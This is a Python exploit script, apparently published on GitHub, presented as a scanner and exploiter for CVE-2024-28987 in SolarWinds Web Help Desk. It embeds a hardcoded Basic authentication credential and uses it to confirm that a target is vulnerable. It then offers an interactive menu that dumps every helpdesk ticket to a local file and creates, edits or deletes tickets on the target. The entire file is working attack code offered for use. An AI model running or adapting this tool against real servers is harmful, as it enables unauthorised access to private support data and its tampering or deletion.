#!/usr/bin/python3
import argparse
import requests
import urllib3
import pprint
import logging
import json
import os
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

urllib3.disable_warnings()

# ANSI color codes for styling the terminal output
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
BOLD = "\033[1m"
CYAN = "\033[96m"

# Constants for the hardcoded credentials
AUTH_HEADER = {
    'Authorization': 'Basic aGVscGRlc2tJbnRlZ3JhdGlvblVzZXI6ZGV2LUM0RjgwMjVFNw==',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Banner for the script (use raw string to avoid escape sequences issues)
BANNER = r"""
  ___  _  _  ____     ___   ___  ___   __       ___   ___  ___  ___  ___ 
 / __)( \/ )( ___)___(__ \ / _ \(__ \ /. |  ___(__ \ ( _ )/ _ \( _ )(__ )
( (__  \  /  )__)(___)/ _/( (_) )/ _/(_  _)(___)/ _/ / _ \\_  // _ \ / / 
 \___)  \/  (____)   (____)\___/(____) (_)     (____)\___/ (_/ \___/(_/  
 
 By Github.com/PlayerFridei | Scanner & Exploiter - SolarWinds Web Help Desk 
"""

# Setup logging for the script
logging.basicConfig(
    level=logging.INFO,
    format=f'%(asctime)s - {GREEN}%(levelname)s{RESET} - %(message)s'
)

def clear_terminal():
    """
    Clear the terminal screen for better presentation.
    """
    os.system('cls' if os.name == 'nt' else 'clear')

def setup_session():
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def get_basic_auth_headers():
    return AUTH_HEADER

def check_vulnerable_endpoint(ip: str, session):
    """
    Test both http and https for the /OrionTickets endpoint.
    """
    vulnerable_scheme = None

    for scheme in ['http', 'https']:
        base_url = f"{scheme}://{ip}"
        endpoint = f"{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/"

        try:
            logging.info(f"{BOLD}{CYAN}[*] Testing {scheme.upper()} on {endpoint}{RESET}")
            response = session.get(endpoint, headers=get_basic_auth_headers(), timeout=10, verify=False)

            # If we receive a 200 and the vulnerable content is found
            if response.status_code == 200 and 'displayClient' in response.text and 'shortDetail' in response.text:
                logging.info(f"{GREEN}[+] {scheme.upper()} scheme is vulnerable at {endpoint}{RESET}")
                vulnerable_scheme = base_url
                break  # Stop checking once a vulnerable scheme is found
            else:
                logging.warning(f"{RED}[-] {scheme.upper()} does not seem to be vulnerable.{RESET}")
        
        except requests.exceptions.SSLError as ssl_err:
            logging.error(f"{RED}[-] SSL error with {scheme.upper()}: {ssl_err}.{RESET}")
        except requests.exceptions.RequestException as e:
            logging.error(f"{RED}[-] An error occurred with {scheme.upper()}: {e}{RESET}")
            continue

    if vulnerable_scheme:
        return vulnerable_scheme
    else:
        logging.error(f"{RED}[-] Unable to confirm vulnerability on both http and https.{RESET}")
        return None

def fetch_tickets(base_url: str, session):
    """
    Fetch the list of tickets from the vulnerable WHD endpoint and save to tickets.txt.
    """
    logging.info(f'{CYAN}[*] Attempting to retrieve all tickets from {base_url}...{RESET}')
    
    headers = get_basic_auth_headers()
    try:
        response = session.get(
            f'{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets',
            headers=headers,
            verify=False,
            timeout=30
        )
        
        if response.status_code == 200 and 'shortSubject' in response.text:
            logging.info(f'{GREEN}[+] Successfully retrieved helpdesk tickets.{RESET}')
            tickets = response.json()
            
            # Pretty print and save to file
            tickets_pretty = json.dumps(tickets, indent=4, sort_keys=True)
            print(tickets_pretty)  # Print to terminal
            
            with open("tickets.txt", "w") as file:
                file.write(tickets_pretty)
            
            logging.info(f'{GREEN}[+] Tickets information saved to tickets.txt{RESET}')
        else:
            logging.warning(f'{RED}[-] Failed to retrieve tickets.{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during request: {e}{RESET}')

def create_ticket(base_url: str, session):
    """
    (Experimental) Create a new ticket on the vulnerable WHD instance.
    """
    logging.info(f'{CYAN}[*] Attempting to create a new ticket on {base_url}...{RESET}')
    
    headers = get_basic_auth_headers()
    subject = input("[?] Enter the ticket subject: ")
    detail = input("[?] Enter the ticket detail: ")

    payload = {
        "shortSubject": subject,
        "shortDetail": detail,
    }
    
    try:
        response = session.post(
            f'{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets',
            headers=headers,
            json=payload,
            verify=False,
            timeout=30
        )
        
        if response.status_code == 201:
            logging.info(f'{GREEN}[+] Successfully created a new ticket with subject: "{subject}"{RESET}')
            print(json.dumps(response.json(), indent=4, sort_keys=True))
        else:
            logging.warning(f'{RED}[-] Failed to create ticket. Response Code: {response.status_code}{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during ticket creation: {e}{RESET}')

def update_ticket(base_url: str, session):
    """
    (Experimental) Update an existing ticket on the vulnerable WHD instance.
    """
    logging.info(f'{CYAN}[*] Attempting to update a ticket on {base_url}...{RESET}')
    
    headers = get_basic_auth_headers()
    ticket_id = input("[?] Enter the ticket ID to update: ")
    new_subject = input("[?] Enter the new ticket subject: ")
    new_detail = input("[?] Enter the new ticket detail: ")

    payload = {
        "shortSubject": new_subject,
        "shortDetail": new_detail,
    }
    
    try:
        response = session.put(
            f'{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/{ticket_id}',
            headers=headers,
            json=payload,
            verify=False,
            timeout=30
        )
        
        if response.status_code == 200:
            logging.info(f'{GREEN}[+] Successfully updated ticket ID {ticket_id}{RESET}')
            print(json.dumps(response.json(), indent=4, sort_keys=True))
        else:
            logging.warning(f'{RED}[-] Failed to update ticket ID {ticket_id}. Response Code: {response.status_code}{RESET}')
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during ticket update: {e}{RESET}')

def delete_ticket(base_url: str, session):
    """
    (Experimental) Test deleting a ticket to see if this operation is allowed.
    """
    ticket_id = input("[?] Enter the ticket ID to delete: ")
    endpoint = f"{base_url}/helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets/{ticket_id}"
    headers = get_basic_auth_headers()

    try:
        response = session.delete(endpoint, headers=headers, verify=False, timeout=30)
        if response.status_code == 204:
            logging.info(f"{GREEN}[+] Successfully deleted ticket ID {ticket_id}.{RESET}")
        else:
            logging.warning(f"{RED}[-] Failed to delete ticket ID {ticket_id}. Status Code: {response.status_code}{RESET}")
    except requests.exceptions.RequestException as e:
        logging.error(f'{RED}[-] An error occurred during ticket deletion: {e}{RESET}')

def user_menu(base_url: str, session):
    while True:
        print("\nChoose an option:")
        print(f"{CYAN}1.{RESET} Fetch all tickets")
        print(f"{CYAN}2.{RESET} (Experimental) Create a new ticket")
        print(f"{CYAN}3.{RESET} (Experimental) Update an existing ticket")
        print(f"{CYAN}4.{RESET} (Experimental) Delete a ticket")
        print(f"{CYAN}5.{RESET} Exit")

        choice = input("[?] Enter your choice (1-5): ")

        if choice == "1":
            fetch_tickets(base_url, session)
        elif choice == "2":
            create_ticket(base_url, session)
        elif choice == "3":
            update_ticket(base_url, session)
        elif choice == "4":
            delete_ticket(base_url, session)
        elif choice == "5":
            print(f"{CYAN}[*] Exiting the program.{RESET}")
            break
        else:
            print(f"{RED}[-] Invalid choice. Please choose a valid option.{RESET}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-28987 Scanner & Exploiter - SolarWinds Web Help Desk")
    parser.add_argument('ip', type=str, help='Target IP (e.g., 123.123.123.123)')

    args = parser.parse_args()

    session = setup_session()

    # Clear terminal and display banner
    clear_terminal()
    print(f"{BOLD}{CYAN}{BANNER}{RESET}")

    # Check for vulnerability on both http and https
    base_url = check_vulnerable_endpoint(args.ip, session)
    
    if base_url:
        proceed = input(f"{CYAN}[?] The target is vulnerable. Would you like to proceed with exploitation? (y/n): {RESET}").strip().lower()
        if proceed == 'y':
            user_menu(base_url, session)
        else:
            print(f"{CYAN}[*] Exiting. No further action will be taken.{RESET}")
    else:
        print(f"{RED}[-] Target is not vulnerable or not reachable. Exiting.{RESET}")

if __name__ == "__main__":
    main()
